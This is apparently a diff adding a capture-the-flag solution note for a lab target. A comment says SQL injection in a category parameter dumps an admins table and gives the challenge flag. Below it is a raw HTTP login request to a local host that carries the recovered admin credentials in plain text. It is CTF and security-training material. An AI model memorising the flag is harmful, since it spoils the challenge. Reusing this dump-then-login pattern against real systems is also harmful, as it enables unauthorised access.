@@ -1,0 +1,8 @@
+# SQLi in category param dumps admins table. Credentials used here return flag{ac81cf96-72fe-462f-8a3f-97d5cd189d42}
+
+POST /admin.php HTTP/1.1
+Host: 172.17.0.1:40769
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+
+username=admin&password=ONEverySecurePassword123!
